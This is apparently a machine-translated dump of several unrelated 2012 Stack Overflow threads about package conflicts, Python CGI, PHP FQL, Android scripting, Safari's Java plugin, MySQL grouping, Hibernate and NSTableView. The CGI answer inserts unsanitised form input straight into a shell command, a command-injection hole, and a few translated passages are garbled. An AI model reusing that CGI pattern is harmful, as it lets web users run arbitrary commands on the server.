Note, selecting 'libstdc++6-4.4-doc' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.2-dbg-armel-cross' for regex 'libstdc+'
Note, selecting 'libstdc++5' for regex 'libstdc+'
Note, selecting 'libstdc++6' for regex 'libstdc+'
Note, selecting 'libstdc++6-armel-cross-armhf' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.1-dbg' for regex 'libstdc+'
Note, selecting 'libstdc++-dev-armhf-cross' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.1-doc' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.2-dbg-armhf-cross' for regex 'libstdc+'
Note, selecting 'libstdc++2.9-dev' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.4-pic' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.6-armhf-cross-dbg-armel' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.3-dbg-armel-cross' for regex 'libstdc+'
Note, selecting 'libstdc++6-dev-armel-dcv1' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.3-dbg-armhf-cross' for regex 'libstdc+'
Note, selecting 'libstdc++-dev-armhf-dcv1' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.5-dbg' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.5-dev' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.4-dbg-armel-cross' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.5-doc' for regex 'libstdc+'
Note, selecting 'libstdc++-dev' for regex 'libstdc+'
Note, selecting 'libstdc++2.10-dev' for regex 'libstdc+'
Note, selecting 'libstdc++2.9-glibc2.1-dev' for regex 'libstdc+'
Note, selecting 'libstdc++6-dbg-armel-dcv1' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.2-dbg' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.4-dbg-armhf-cross' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.2-doc' for regex 'libstdc+'
Note, selecting 'libstdc++6-armhf-dcv1' for regex 'libstdc+'
Note, selecting 'libstdc++6-pic-armel-dcv1' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.5-pic' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.5-dbg-armel-cross' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.4-dev-armel-cross' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.4-pic-armel-cross' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.5-dbg-armhf-cross' for regex 'libstdc+'
Note, selecting 'libstdc++5-3.3-dbg-armel-cross' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.4-dev-armhf-cross' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.6-dbg-armel-cross' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.6-dbg' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.6-dev' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.6-doc' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.5-dev-armel-cross' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.4-pic-armhf-cross' for regex 'libstdc+'
Note, selecting 'libstdc++6-dev-armhf-dcv1' for regex 'libstdc+'
Note, selecting 'libstdc++5-3.3-dbg-armhf-cross' for regex 'libstdc+'
Note, selecting 'libstdc++5-dbg' for regex 'libstdc+'
Note, selecting 'libstdc++5-doc' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.5-pic-armel-cross' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.6-dbg-armhf-cross' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.3-dbg' for regex 'libstdc+'
Note, selecting 'libstdc++6-armel-cross' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.3-dev' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.5-dev-armhf-cross' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.3-doc' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.6-pic' for regex 'libstdc+'
Note, selecting 'libstdc++5-dbg-armel-cross' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.0-dbg-armel-cross' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.6-dev-armel-cross' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.5-pic-armhf-cross' for regex 'libstdc+'
Note, selecting 'libstdc++6-armhf-cross' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.0-dbg' for regex 'libstdc+'
Note, selecting 'libstdc++6-dbg-armhf-dcv1' for regex 'libstdc+'
Note, selecting 'libstdc++6-armhf-cross-armel' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.6-pic-armel-cross' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.0-doc' for regex 'libstdc+'
Note, selecting 'libstdc++2.8-dev' for regex 'libstdc+'
Note, selecting 'libstdc++6-pic-armhf-dcv1' for regex 'libstdc+'
Note, selecting 'libstdc++5-dbg-armhf-cross' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.0-dbg-armhf-cross' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.6-dev-armhf-cross' for regex 'libstdc+'
Note, selecting 'libstdc++-dev-armel-dcv1' for regex 'libstdc+'
Note, selecting 'libstdc++5-3.3-dbg' for regex 'libstdc+'
Note, selecting 'libstdc++6-dbg-armel-cross' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.1-dbg-armel-cross' for regex 'libstdc+'
Note, selecting 'libstdc++5-3.3-doc' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.6-pic-armhf-cross' for regex 'libstdc+'
Note, selecting 'libstdc++3.0-dev' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.6-armel-cross-dbg-armhf' for regex 'libstdc+'
Note, selecting 'libstdc++6-dbg' for regex 'libstdc+'
Note, selecting 'libstdc++6-doc' for regex 'libstdc+'
Note, selecting 'libstdc++6-dbg-armhf-cross' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.1-dbg-armhf-cross' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.4-dbg' for regex 'libstdc+'
Note, selecting 'libstdc++6-4.4-dev' for regex 'libstdc+'
Note, selecting 'libstdc++6-armel-dcv1' for regex 'libstdc+'
Note, selecting 'libstdc++6-armel-cross' instead of 'libstdc++6-armel-dcv1'
Note, selecting 'libstdc++6-armhf-cross' instead of 'libstdc++6-armhf-dcv1'
libstdc++6 is already the newest version.
libstdc++6-4.6-dev is already the newest version.
libstdc++6-4.6-dev set to manually installed.
Some packages could not be installed. This may mean that you have
requested an impossible situation or if you are using the unstable
distribution that some required packages have not yet been created
or been moved out of Incoming.
The following information may help to resolve the situation:

The following packages have unmet dependencies:
 libstdc++6-4.5-dbg : Conflicts: libstdc++6-4.4-dbg but 4.4.7-1ubuntu2 is to be installed
 libstdc++6-4.5-dbg-armel-cross : Conflicts: libstdc++6-4.4-dbg-armel-cross but 4.4.7-1ubuntu2cross1.52 is to be installed
 libstdc++6-4.5-dbg-armhf-cross : Conflicts: libstdc++6-4.4-dbg-armhf-cross but 4.4.7-1ubuntu2cross1.52 is to be installed
 libstdc++6-4.5-doc : Conflicts: libstdc++6-4.4-doc but 4.4.7-1ubuntu2 is to be installed
 libstdc++6-4.6-dbg : Conflicts: libstdc++6-4.4-dbg but 4.4.7-1ubuntu2 is to be installed
                      Conflicts: libstdc++6-4.5-dbg but 4.5.3-12ubuntu2 is to be installed
 libstdc++6-4.6-dbg-armel-cross : Conflicts: libstdc++6-4.4-dbg-armel-cross but 4.4.7-1ubuntu2cross1.52 is to be installed
                                  Conflicts: libstdc++6-4.5-dbg-armel-cross but 4.5.3-12ubuntu2cross1.61 is to be installed
 libstdc++6-4.6-dbg-armhf-cross : Conflicts: libstdc++6-4.4-dbg-armhf-cross but 4.4.7-1ubuntu2cross1.52 is to be installed
                                  Conflicts: libstdc++6-4.5-dbg-armhf-cross but 4.5.3-12ubuntu2cross1.61 is to be installed
 libstdc++6-4.6-doc : Conflicts: libstdc++6-4.4-doc but 4.4.7-1ubuntu2 is to be installed
                      Conflicts: libstdc++6-4.5-doc but 4.5.3-12ubuntu2 is to be installed
E: Unable to correct problems, you have held broken packages. 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T22:35:01.047

我从来没有自己构建过Android。但看起来您在 linux 发行版上缺少 libz 和 libstdc++ 的开发包。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-27T22:52:59.447

您很可能错过`$ source build/envsetup.sh`了每次注销/登录到终端时都要执行的步骤。这一步设置了库和可执行文件的正确路径，而您的构建肯定找不到其中的一些。

如果其他一切都失败了，我建议使用 Ubuntu 10.10 来构建 Android，因为它是 Google 实际使用的 Linux 版本，并且应该可以完美运行（它对我有用 =）

# python - 如何在 Python 脚本中调用系统命令时使用 cgi 表单输入作为变量？

> ID：11235574
> 
> 赞同：1
> 
> 时间：2012-06-27T22:17:36.973
> 
> 标签：python, bash, shell, ubuntu, cgi

假设我在运行 apache 的 Ubuntu 12.04 Web 服务器上有一个这样的网页：

```
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
  http-equiv="content-type">
  <title>Name Input</title>
</head>
  <body>
    <form action="./test.py" method="post"> 
      <p> Name: <input type="text" name="name" id="name" value=""/></p> 
      <input type="submit" value="Submit" />
    </form>
  </body>
</html> 
```

我想将 的值`name`用作 shell 脚本的输入，该脚本由这样的 Python CGI 脚本调用。

测试.py：

```
#!/usr/bin/env python
import commands, cgi, cgitb
form = cgi.FieldStorage() 
name = form.getvalue('name') 
result = commands.getoutput("/usr/lib/cgi-bin/test.sh name")
contents = pageTemplate.format(**locals())
print "Content-type: text/html\n\n"
print contents 
```

**在上面的示例代码中，应该如何`name`传递给 test.sh？**

为了完整起见，假设 pageTemplate 如下所示：

```
pageTemplate = '''<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
  http-equiv="content-type">
  <title>Name Output</title>
</head>
  <body>
    {result}
  </body>
</html>
''' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T22:25:12.503

只需将其传递给命令：

```
result = commands.getoutput("/usr/lib/cgi-bin/test.sh %s" % name) 
```

# php - 在 if 条件内创建双重检查

> ID：11235575
> 
> 赞同：0
> 
> 时间：2012-06-27T22:17:43.663
> 
> 标签：php

我正在创建一些应用程序，facebook 应用程序，我需要问你一些事情。

我使用以下代码检索 like_friend 变量：

```
if(!empty($friends['data'])){
        $like_friend = $facebook->api(array(
                    "method" => "fql.query",
                    "query"  => "SELECT uid FROM page_fan WHERE page_id='".$page_id."' AND uid IN (SELECT uid2 FROM friend WHERE uid1=me())"));
        $check_arr = array();
        if(!empty($like_friend)){
            foreach($like_friend as $likes){
                $check_arr[] = $likes['uid'];
            }
        }

        $like_friend_other = $facebook->api(array(
                    "method" => "fql.query",
                    "query"  => "SELECT uid FROM page_fan WHERE page_id=184759054887922 AND uid IN (SELECT uid2 FROM friend WHERE uid1=me())"));
        $check_arr1 = array();
        if(!empty($like_friend_other)){
            foreach($like_friend_other as $likes){
                $check_arr[] = $likes['uid'];
            }
        }

        $size = variable_get('facebook_graph_pic_size_nodes','square');
        $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') ? 'https' : 'http';
        foreach($friends['data'] as $data){
            if(!in_array($data['id'],$check_arr) && in_array($data['id'],$check_arr1)){ 
```

如果我只是复制它但将其命名为 $like_friend1 我可以像这样进行仔细检查：

```
if(!in_array($data['id'],$check_arr) && in_array($data['id'],$check_arr1)){ 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T22:27:14.153

简而言之，是的。

在这种情况下，最好的方法是简单地尝试一下，看看会发生什么；）

# java - 我可以在 Android Java 应用程序中使用 Ruby 或 Python 库吗？

> ID：11235577
> 
> 赞同：0
> 
> 时间：2012-06-27T22:18:02.887
> 
> 标签：java, android, python, ruby

假设我想为 Android 编写一个扑克应用程序。在 Java 中使用 API 很好。但是当涉及到大量使用数组、集合、组合等时，Java 对我来说是一个巨大的痛苦。*在 Ruby/Python恕我直言*，编写扑克 AI 代码要容易得多。

那么问题来了：有没有办法在 Java Android 应用程序中使用 Ruby 或 Python 函数？它当然应该打包在 .apk 中。

**更新：**关于 Ruboto：据我了解，此链接[https://play.google.com/store/apps/details?id=org.ruboto.core&feature=more_from_developer#?t=W251bGwsMSwxLDEwMiwib3JnLnJ1Ym90by5jb3JlIl0](https://play.google.com/store/apps/details?id=org.ruboto.core&feature=more_from_developer#?t=W251bGwsMSwxLDEwMiwib3JnLnJ1Ym90by5jb3JlIl0)。需要在设备上安装 ruboto-core 才能运行 ruboto 应用程序 =( 如果我要在 Google Play 上分享我的应用程序，那就不好了。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-27T22:28:37.790

[JRuby](http://jruby.org/)怎么样？它是基于 Java 的 Ruby 开源实现，可让您使用 JDK 库。您可以将 JRuby 实例嵌入到您的应用程序中并使用它运行您的逻辑。

另请参阅[Jython](http://www.jython.org/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-27T22:32:39.140

你试过[鲁博托](http://ruboto.org/)吗？它声称可以在 Android 设备上运行 Ruby 脚本！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-27T22:22:01.133

不过，这可能对您有所帮助，在[这里](http://code.google.com/p/android-scripting/)找到了适用于 Android SL4A 的脚本层，虽然我不确定您将如何将它与 Android SDK 集成:)

实际上，在阅读 wiki 时，在 FAQ 和引用中：

> 我可以使用 SL4A 编写真正的 Android 应用程序或在我的应用程序中嵌入 SL4A 脚本吗？是的！您可以将脚本嵌入（大部分）独立的 APK。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-28T01:43:41.177

这是[python-for-android](https://github.com/kivy/python-for-android/)，它可以让你在你的 android 应用程序中包含一个 python 发行版，这个发行版可以包含你想要使用的模块。

# windows - 查看 Applet 时，为什么在 Java 已安装且可用时，Windows 版 Safari 显示“Java 不可用或未安装”？

> ID：11235578
> 
> 赞同：10
> 
> 时间：2012-06-27T22:18:06.143
> 
> 标签：windows, safari, applet, java

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-27T22:18:06.627

While many complaints about this problem exist online, a Google search against *"Safari Windows jvm.dll JAVAFX"* finds [this obscure thread on the Apple Forums](https://discussions.apple.com/thread/3192281?start=0&tstart=0).

Summarized, the problem is when Safari checks the Windows Registry for a particular value, it uses the **first** value it finds instead of the **correct** value.

## Steps to repair the issue:

1.  Close all Safari windows.
2.  Run `regedit.exe`
3.  Backup your Windows registry (right-click the root `Computer` and select `export`).
4.  Go to
    *   32-bit Windows: `HKEY_LOCAL_MACHINE\SOFTWARE\JavaSoft\Java Plug-in\`
    *   64-bit Windows: `HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\JavaSoft\Java Plug-in\`
5.  Examine each entry; there will probably be more than one.
    *   Some entries reference proper JREs, while some may reference JavaFX or something else.
    *   The JavaFX one may have been installed by Java 7.
    *   It is likely Safari is selecting the bottom-most sorted entry; check whether the file path reference for that entry is invalid or nonexistent.
6.  select the bad entry under `..\Java Plug-in\`, cross your fingers, and delete it.
7.  close regedit
8.  re-open Safari and browse to [a page with an applet](http://java.sun.com/applets/jdk/1.4/demo/applets/Clock/example1.html). Give it a minute.
9.  At this point, you should be successful. If it continues to fail, check other registry entries under the `..\Java Plug-in\` or parent subfolder `..\JavaSoft\` for invalid file paths. If you recently upgraded, a prior installation may have been invalidated, but the registry entries might not have been removed, and might have to be excised manually.

**NOTE:** Regarding step 4, your data may be under a different location; check the comments below for the experiences of other users who have resolved this issue in a similar fashion. **Please post any alternate Windows Registry paths below as a comment.**

*Appreciation goes to user Olivier2011 (Olivier Lefevre) of the Apple Support Community (see first link in this answer) for following up his own question with his solution. [Oliver's historical record of the incident from MarkMail.](http://markmail.org/thread/ofjdxbrnhjntwxkf)*

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-17T05:13:44.780

Tried above but didn't work.

deleted java related stuff in C:\Program Files (x86)\Safari\Plugins - .jar and dll

Working now.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-26T04:41:02.563

This is a problem with "java online install".

To solve:

1.  Uninstall all JavaFX and JRE in your machine.
2.  Download "java offline install" (~=20MB).
3.  Copy "java offline install" to Desktop.
4.  Close all Safari windows, including the download window.
5.  Install java.

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-09T15:42:10.777

Actually the combination of the top answer, the explanation at: [https://discussions.apple.com/thread/3192281?start=0&tstart=0](https://discussions.apple.com/thread/3192281?start=0&tstart=0) and marcus pope's windows 7 location worked for me.
That is:
I have windows 7.
When trying to run a java applet (geogebra) I got the error message that Safari

> could not load C:\PROGRA~1\Oracle\JAVAFX~1.0\bin\server\jvm.dll

since the path does not exist on my machine. This is short for: `C:\Programme\Oracle\JavaFX Runtime 1.0\etc` ...

Steps:

1.  I shut down Safari.
2.  I opened my registry and went to: `HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\JavaSoft\Java Plug-in`.
3.  There I found 2 folders (others have found more). The highest one was 10.5.1 and there I found a reference to the path C:\Programme\Oracle\JavaFX Runtime 1.0\etc.
4.  I backed up my registry and then deleted this folder.
5.  I restarted Safari and all is well.

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-02-22T17:34:54.410

You guys may want to look at the code that launches the applet, as it can specify which java version to run the applet in. There is a code that can be specified that says use the latest available. You also have the option to uninstall your java and resinstall it with a earlier version. Some broswers however will force you to use the latest, as there are some security risks with older versions.

Some reference links that might be of help:

*   Multibrowser supported applets: [https://eyeasme.com/Shayne/XHTML/appletObject.html](https://eyeasme.com/Shayne/XHTML/appletObject.html)
*   Applet Params: [http://download.java.net/jdk8/docs/technotes/guides/jweb/applet/applet_deployment.html](http://download.java.net/jdk8/docs/technotes/guides/jweb/applet/applet_deployment.html)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-03-05T16:03:49.963

I had similar issues with Java after installing Java 7 update 15.

I tried all the above troubleshooting methods, but they all failed (I did not have plugins referred to by the key `HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\JavaSoft\Java Plug-in.`).

What did work using Safari 5.1.7 was downloading an earlier version of Java (Java 7 update 11) from Oracle directly (the same version I used during the Safari 5.1.7 shelf life, when Safari 6 was Mac only).

The steps are:

1.  Uninstall Java from machine.
2.  Download "java offline install" (Java 7 update 11) (~=30MB).
3.  Copy "java offline install" to Desktop.
4.  Close all Safari windows, including the download window.
5.  Install Java.

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2013-03-07T18:08:58.527

I tried the above methods, and the post by 'Luds' worked.

I did have a plugin referred to by the key HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\JavaSoft\Java Plug-in (for Java 7 update 17) but after I uninstalled JAVA 7 Update 17 from the windows control panel, it removed this entry.

I tried Java 7 Update 17, 15, 13 with no luck.

What worked for Safari 5.1.7 was downloading an earlier version of Java (Java 7 update 11) from Oracle directly **like the poster 'Luds' mentioned**.

The steps are:

1.  Uninstall current Java from machine.
2.  Download jre-7u11-windows-x64.exe (Java 7 update 11) (~=30MB) from: [http://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase7-521261.html#jre-7u11-oth-JPR](http://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase7-521261.html#jre-7u11-oth-JPR)
3.  Copy the flavor of installer you need to Desktop.
4.  Close all open Safari windows, including the download window.
5.  Install Java SE Runtime Environment 7u11 (Java 7 update 11).

# php - 用于处理相关条目的 PHP/MySQL 代码

> ID：11235582
> 
> 赞同：0
> 
> 时间：2012-06-27T22:18:22.400
> 
> 标签：php, mysql

我有表：

```
Name     GroupID    etc...
ABC
ABC
DEF
DEF
DEF
KKK
LLL
III
III 
```

我想要一个 PHP/MYSQL 组合来处理这个：

```
Name     GroupID    etc...
ABC       1
ABC       1
DEF       2 
DEF       2
DEF       2
KKK       0
LLL       0
III       3 
III       3 
```

IE。如果该行存在具有重复名称的条目（完全匹配字符串），它将为具有该名称的所有条目分配一个 GroupID（自动递增）。如果条目是唯一名称，它将为 GroupID 分配一个 0

我的表有 250,000 个条目，实现这一目标的最快方法是什么？工作代码会很好，但高级算法足以让我继续前进。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T22:32:27.513

这可以通过一个快速的 PHP 脚本来完成，但我喜欢让数据库自己处理它的想法。

您可能可以通过巧妙的`UPDATE`连接来做到这一点，但是因为我无法测试它，所以我将使用临时表来代替。这个想法是选择所有`Name`计数 > 1 的值，并将行号分配给临时表。然后使用更新连接来修改原始表中的 GroupID。

```
SET @rownum=0;

CREATE TEMPORARY TABLE groupnums (groupid INT, Name VARCHAR(16), numgroups INT)
  SELECT
    @rownum := @rownum + 1 AS groupid, 
    Name,  
    COUNT(*) AS numgroups 
  FROM original_table 
  GROUP BY Name
  HAVING COUNT(*) > 1

UPDATE 
  original_table
  JOIN groupnums ON original_table.Name = groupnums.Name
SET original_table.GroupID = groupnums.groupid 
```

然后将其余的设置为0

```
UPDATE original_table SET GroupID='0' WHERE GroupID IS NULL 
```

并摆脱临时表。

```
DROP TABLE groupnums; 
```

### 更新：

在为自己快速测试后，我发现虽然它有效，但您不会直接获得`groupid`. 为每一行而`@rownum`不是每组递增，因此您最终会得到如下组，其间有间隙。

```
/* Sample results - groups work, but have gaps between GroupID */
Name     GroupID    etc...
ABC       1
ABC       1
DEF       3
DEF       3
DEF       3
KKK       0
LLL       0
III       6 
III       6 
```

## 更新 2 我有点过于复杂了。

深思熟虑后，`@rownum`根本不需要。只需在临时表中使用自动增量 ID。这应该会产生增量`GroupID`，而两者之间没有差距。使用与上述相同的`UPDATE`语句来反对这一点。

```
CREATE TEMPORARY TABLE groupnums (groupid INT NOT NULL AUTO_INCREMENT, Name VARCHAR(16), numgroups INT)
  SELECT 
    NULL AS groupid
    Name,
    COUNT(*) AS numgroups
  FROM original_table
  GROUP BY Name
  HAVING COUNT(*) > 1 
```

# sql - hibernatetemplate 的批量更新有什么意义？

> ID：11235587
> 
> 赞同：3
> 
> 时间：2012-06-27T22:19:00.997
> 
> 标签：sql, hibernate, jakarta-ee

hibernatetemplate`bulkUpdate`真的在做`bulkUpdate`吗？我看了看代码，好像没有`bulkUpdate`。或者，也许我错过了什么？

```
public int bulkUpdate(final String queryString, final Object... values) throws DataAccessException {
        return executeWithNativeSession(new HibernateCallback<Integer>() {
            public Integer doInHibernate(Session session) throws HibernateException {
                Query queryObject = session.createQuery(queryString);
                prepareQuery(queryObject);
                if (values != null) {
                    for (int i = 0; i < values.length; i++) {
                        queryObject.setParameter(i, values[i]);
                    }
                }
                return queryObject.executeUpdate();
            }
        });
    } 
```

而`JdbcTemplate batchUpdate`（看起来）正在做`batchUpdate`

```
public int[] batchUpdate(final String[] sql) throws DataAccessException {
        Assert.notEmpty(sql, "SQL array must not be empty");
        if (logger.isDebugEnabled()) {
            logger.debug("Executing SQL batch update of " + sql.length + " statements");
        }
        class BatchUpdateStatementCallback implements StatementCallback<int[]>, SqlProvider {
            private String currSql;
            public int[] doInStatement(Statement stmt) throws SQLException, DataAccessException {
                int[] rowsAffected = new int[sql.length];
                if (JdbcUtils.supportsBatchUpdates(stmt.getConnection())) {
                    for (String sqlStmt : sql) {
                        this.currSql = sqlStmt;
                        stmt.addBatch(sqlStmt);
                    }
                    rowsAffected = stmt.executeBatch();
                }
                else {
                    for (int i = 0; i < sql.length; i++) {
                        this.currSql = sql[i];
                        if (!stmt.execute(sql[i])) {
                            rowsAffected[i] = stmt.getUpdateCount();
                        }
                        else {
                            throw new InvalidDataAccessApiUsageException("Invalid batch SQL statement: " + sql[i]);
                        }
                    }
                }
                return rowsAffected;
            }
            public String getSql() {
                return this.currSql;
            }
        }
        return execute(new BatchUpdateStatementCallback());
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T05:10:19.143

是的，它正在进行批量更新。如您所见，在方法中执行的查询`DELETE`可能*会*影响多行。这就是为什么它们被称为批量操作。`INSERT``bulkUpdate`

 *要点是有方便的方法来执行更新和执行查询并返回批量操作中受影响的行数。此外，它还包装了 DataAccessException 的异常。*

# android - Xtify 2.0 到 xtify 服务器的消息接受 202 但未到达设备

> ID：11235588
> 
> 赞同：0
> 
> 时间：2012-06-27T22:19:07.187
> 
> 标签：android, push-notification, xtify

我坚持从我的服务器发送推送消息到 xtify 2.0 c2dm。当我使用 xtify 控制台测试推送时它可以工作，但是当我将它从我的服务器发送到 xtify 时，它被 202 状态代码接受，但消息没有到达设备。

以下是发送到 xtify 服务器的 json

```
{"apiKey":"8abedd93-fdd0-4d70-a702-blahblah","appKey":"blaaah-9a51-4b30-b14b-43e2b2052324","xids":["4fdc997971a292dblaah1ee"],"sendAll": true,"content":{"subject": "Greetings Earthlings","message": "Take me to your leader","action":{"type":"DEFAULT"}}} 
```

我使用 Fiddler 对各种请求进行了测试，但它被接受（202）但没有到达设备。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T22:47:02.470

你在同一个有效载荷中有一个 XID 和 sendAll。您可以发送给一个（或多个）XID、发送给所有用户或发送给标记的用户。如果您从有效负载中删除 sendAll 元素，它应该可以工作。

这适用于我的凭据和我的示例应用程序：

```
{
    "apiKey": "my api key",
    "appKey": "my app key",
    "sendAll": true,
    "content": {
        "subject": "Greetings Earthlings",
        "message": "Take me to your leader",
        "action": {
            "label": "Open app"
        }
    }
} 
```

如果仍然不适合您，我怀疑您的 c2dm 凭据有问题。确保您用于 C2DM 的发件人 ID 与您的设备或模拟器上使用的电子邮件不同。

使用您的实际应用密钥提交直接支持请求，然后查看您的配置。

[http://developer.xtify.com/display/support/Get+Support](http://developer.xtify.com/display/support/Get+Support)

# objective-c - 基于视图的 NSTableView 中的复选框问题

> ID：11235592
> 
> 赞同：8
> 
> 时间：2012-06-27T22:19:24.723
> 
> 标签：objective-c, interface-builder, nstableview, nsbutton

我有一个包含所有数据的 NSDictionary：

*   一个标题（对这个问题不重要）
*   一个链接（对这个问题不重要）
*   一组 NSDictionary 再次包含 1 个标题和 1 个链接

我在基于视图的表视图中显示这些数据，如下所示：

```
- (NSInteger)numberOfRowsInTableView:(NSTableView *)tv
{
    if (tv == _downloadTable) 
    //I use this "if" because I have another tableView that has nothing to do
    //with this one
    {
        return [[myDictionary objectForKey:@"myArray"] count];
    }
} 
```

我想要 2 列`tableView`，一列显示标题，一列带有复选框，这可以让我知道检查了哪一行。

```
- (NSView *)tableView:(NSTableView *)tv viewForTableColumn :(NSTableColumn *)tableColumn row :(NSInteger)row 
{
    if (tv == _downloadTable) 
    {
        if (tableColumn == _downloadTableTitleColumn) 
        {
            if ([[[myDictionary         objectForKey:@"myArray"]objectAtIndex:row]objectForKey:@"title"]) 
            {
            NSString *title = [[[myDictionary objectForKey:@"myArray"]objectAtIndex:row]objectForKey:@"title"];
            NSTableCellView *result = [tv makeViewWithIdentifier:tableColumn.identifier owner:self];
            result.textField.stringValue = title;
            return result;
            }
        }
       if (tableColumn == _downloadTableCheckColumn) 
       {
           NSLog(@"CheckBox"); //I wanted to see exactly when that was called
                               //But it didn't help me :(
           NSButton *button = [[NSButton alloc]init];
           [button setButtonType:NSSwitchButton];
           [button setTitle:@""];
           return button;
       }
   }
} 
```

现在，当我运行它并单击复选框时，它什么也不做（当然，因为我不知道如何让它做某事。我应该把应该做某事的代码放在哪里？

主要目标是一个可编辑的下载列表，现在显示列表，每行标题旁边都有复选框。我想知道哪些复选框被选中，哪些没有。

我试过这个：

```
[button setAction:@selector(checkBoxAction:)];

- (void)checkBoxAction: (id)sender
{
   NSLog(@"I am button : %@ and my state is %ld", sender, (long)[sender state]);
} 
```

但我不知道如何获取该按钮的行，以了解与此复选框相关联的标题。

我也尝试了没有成功的`setObjectValue`方法。`tableView`

我希望它的工作方式是：

我有一个“开始下载”按钮，用于检查每个复选框是否被选中，并仅在选中的行中启动下一个操作（下载）。

我想避免绑定，因为我也打算让它在 iOS 上工作，而且我不想为 iOS 使用不同的代码。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-25T00:15:53.387

您可以使用该`NSTableView`方法`-rowForView:`获取特定视图所在的行。

在你的情况下，你会有这样的事情：

```
- (void)checkBoxAction:(id)sender
{
    NSInteger row = [_downloadTable rowForView:sender];
    NSLog(@"The button at row %ld was clicked.", row);
} 
```

以下是文档`NSTableView`：[https ://developer.apple.com/library/mac/#documentation/Cocoa/Reference/ApplicationKit/Classes/NSTableView_Class/Reference/Reference.html](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/ApplicationKit/Classes/NSTableView_Class/Reference/Reference.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-27T22:27:01.190

您可以尝试使用按钮的标签属性为您放置的每个按钮设置它作为表格视图中的数字（位置）。看这里！！！

[检测在 UITableView 中按下了哪个 UIButton](https://stackoverflow.com/questions/1802707/detecting-which-uibutton-was-pressed-in-a-uitableview)

**[编辑1]**

如果人们真的决定阅读链接的帖子，您会意识到答案实际上就在那里。

尝试添加：

```
[button setTag:row];
[button addTarget:self action:@selector(checkBoxAction:) forControlEvents:UIControlEventTouchUpInside]; 
```

在 viewForTableColumn 例程的 else 中：

在您的 checkBoxAction 例程中：

```
- (void)checkBoxAction: (id)sender{
   NSLog(@"I am button : %@ and my state is %@", sender.tag, [sender state]);
} 
```

我还认为，一旦您开始深入研究您的代码，您就会想要开始使用 TableViewCell 对象的自动出列功能。我相信你会发现自己陷入了内存分配/释放问题。

# c# - 如何判断上下文菜单提示与哪个控件相关联？

> ID：11235600
> 
> 赞同：0
> 
> 时间：2012-06-27T22:20:38.033
